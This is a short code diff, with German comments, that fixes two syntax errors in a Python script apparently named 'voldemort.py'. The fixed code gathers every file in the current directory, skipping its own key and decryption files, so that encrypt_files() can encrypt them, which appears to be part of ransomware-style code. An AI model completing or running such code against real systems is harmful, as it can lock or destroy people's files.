@@ -77,7 +77,7 @@ def checkIf():
     # Dateien finden
     files = []
     for file in os.listdir():
-        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py"or file == "aes_key.enc"  or file = "un_voldemort.py":
+        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py"or file == "aes_key.enc"  or file == "un_voldemort.py":
             continue
         if os.path.isfile(file):
             files.append(file)
@@ -128,7 +128,7 @@ def encrypt_files():
         print("Ungültige Wahl!")
         return
 
-   Dateien verschlüsseln 
+  # Dateien verschlüsseln 
     files = [file for file in os.listdir() if os.path.isfile(file) and file not in ("voldemort.py", "thekey.key", "decrypt.py", "aes_key.enc", "un_voldemort.py") and not file.startswith('.')] 
     print("Files to encrypt:", files) 
 
